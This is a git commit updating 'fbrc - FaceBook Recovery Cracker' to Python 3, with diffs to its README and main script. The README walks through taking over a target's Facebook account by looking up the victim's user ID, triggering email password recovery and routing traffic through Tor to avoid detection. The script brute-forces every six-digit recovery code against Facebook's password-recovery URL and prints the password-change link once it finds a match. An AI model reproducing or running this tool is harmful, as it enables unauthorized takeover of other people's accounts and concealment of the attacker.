5120d38a77ff3ee825b5001a959faeeb31f60922
yvain <yvain29@gmail.com>
2020-08-20 13:25:15 +0200

    updated to python3, added a small requirement file to keept it noob friendly.

--- README.md
+++ README.md
@@ -4,35 +4,37 @@ fbrc - FaceBook Recovery Cracker
 
 Prerequisites:
 
-python2.7 and pip2
+python3 !
 
 -access to facebook
 
 -target email
 
-pip2 install numba urllib httlib
+pip3 install -r requirements  
+chmod +x fbrc.py  
+./fbrc.py  
 
+Usage:  
 
-Usage:
+I suggest to simply (and safely) forward the program's connection through tor with a command like "tsocks python fbrc.py",  
+If you have a vpn it will just be faster but less secured.  
+1-On facebook, navigate to the target's wall and look at the source code of the page,  
+search (ctrl+f) for the value of USER_ID (something like 10003...) and copy it.  
 
-I suggest to simply (and safely) forward the program's connection through tor with a command like "tsocks python fbrc.py"
+2-Go to facebook's login page, select "Forgot Password ?" and enter the email,  
+you'll be taken to the recovery option asking which method you want to use.  
+Choose email and make it send the code.  
 
-1-On facebook, navigate to the target 'wall' and look at the source code of the page, search (ctrl+f) for the value of USER_ID (something like 10003...) copy it.
-
-2-Use tor browser and go to facebook's login page, select "Forgot Password ?" and enter the email, you'll be taken to the recovery option asking which method you want to use.
-Choose email and make it send the code. (it's also possible to do it with the phone number but requires a tweak of the code and i'll only do it upon request via issues)
-
-3-Run fbrc.py and enter the user id, you'll be given the link to change the password in under 3 days if your network is not too slow.
-
-!!!the link will be output in the terminal so DON'T BE A DICK and try to right click on it to open it, instead, use tor browser and paste the link in the address bar!!!
+3-Run fbrc.py and enter the user id, you'll be given the link to change the password in under 3 days if your network is not too slow.  
 
 Notes:
 
-Please don't victimize people.
+Please don't victimize people.  
+Make an effort and read the code.  
 
-Make an effort and read the code (it could be a virus right ?).
+Nothing really magical but for the foolishness that allows that:  The password's changing page is an url defined by the user ID and the recovery code,  
+Instead of bruteforcing the recovery code, we bruteforce the url of this page.  
 
-Nothing really magical but for the foolishness of facebook's design that allows that: the recovery page is a static url that has the user id and the recovery code as a parameter, that is all and you might understand now how it's easily hacked.
-The password's changing page might expires but you'll usually get the link before it does, so if it fails repeat the whole procedure (from step 2) before filling and issue.
-
+Note that there might still be an impossibility to change the password because of IP addresses checks,  
+I don't know if obtaining the recovery page url gives you a precedence over the registered IP, and I don't know about the timeout for this page.  
 
--- fbrc.py
+++ fbrc.py
@@ -1,12 +1,12 @@
-#!/usr/bin/python2.7
+#!/usr/bin/env python3
 import urllib
-import httplib
+import http.client as libhttp
 import numba
 
-print "READ README FIRST PLEASE"
-print "you have to trigger the password recovery at https://www.facebook.com/login/identify/?ctx=recover"
-connection = httplib.HTTPSConnection("www.facebook.com", 443)
-user = raw_input("Enter user numerical ID: ")
+print("READ README FIRST PLEASE")
+print("you have to trigger the password recovery at https://www.facebook.com/login/identify/?ctx=recover")
+connection = libhttp.HTTPSConnection("www.facebook.com", 443)
+user = input("Enter user numerical ID: ")
 
 headers={"Host":"www.facebook.com", "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0", "Accept-Language": "en-US, en"}
 
@@ -16,25 +16,26 @@ rain = 0
 count = 0
 cs = "0123456789"
 
-print "One million recovery code to test"
+print("One million recovery code to test")
 for index[0] in range(10):
-        for index[1] in range(10):
-                for index[2] in range(10):
-                        for index[3] in range(10):
-                                for index[4] in range(10):
-                                        for index[5] in numba.prange(10):
-                                                #Let it rain !#############################
-                                                for x in range(6):                        #
-                                                        code[x] = cs[(index[x]+rain)%10]  #
-                                                        rain += x+1                       #
-                                                rain -= (1+2+3+4+5+6)-2                   #
-                                                ###########################################
-                                                query = urllib.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
-                                                if count % 1000 == 0:
-                                                        print "%f%% done" % (float(count)*100.0/1000000.0)
-                                                connection.request('GET', "/recover/password/?%s" % query, headers=headers)
-                                                answer = connection.getresponse()
-                                                if answer.read().find("Choose a New Password") >= 0:
-                                                        print "!!!!USE TOR!!!!\nlink is https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code)
-                                                        exit(0)
-                                                count += 1
+	for index[1] in range(10):
+		for index[2] in range(10):
+			for index[3] in range(10):
+				for index[4] in range(10):
+					for index[5] in numba.prange(10):
+						#Let it rain !###############################
+						for x in range(6):							#
+							code[x] = cs[(index[x]+rain)%10]		#
+							rain += x+1								#
+						rain -= (1+2+3+4+5+6)-2						#
+						#############################################
+						query = urllib.parse.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
+						if count % 1000 == 0:
+							print("%f%% done" % (float(count)*100.0/1000000.0))
+						connection.request('GET', "/recover/password/?%s" % query, headers=headers)
+						answer = connection.getresponse()
+						text = str(answer.read())
+						if text.find('Choose a New Password') != -1:
+							print("!!!!USE TOR!!!!\nlink is https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code))
+							exit(0)
+						count += 1
